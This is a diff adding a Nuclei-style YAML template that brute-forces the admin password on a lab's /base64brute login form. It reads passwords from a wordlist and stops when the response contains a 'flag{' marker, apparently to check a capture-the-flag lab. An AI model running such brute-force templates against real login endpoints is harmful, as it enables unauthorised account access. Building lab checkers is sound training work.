@@ -1,0 +1,32 @@
+id: base64_brute
+
+info:
+  name: Check SidneyJob and cherepawwka lab
+  author: SidneyJob
+  severity: low
+  description: Check correct get_brute 
+
+http:
+  - raw:
+    - |
+      GET / HTTP/2
+      Host: {{Hostname}}
+
+    - |
+      POST /base64brute HTTP/2
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+
+      username=admin&password={{pass}}
+
+    payloads:
+      pass: ./pass
+      
+    stop-at-first-match: true
+    cookie-reuse: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "flag{"
+    attack: batteringram
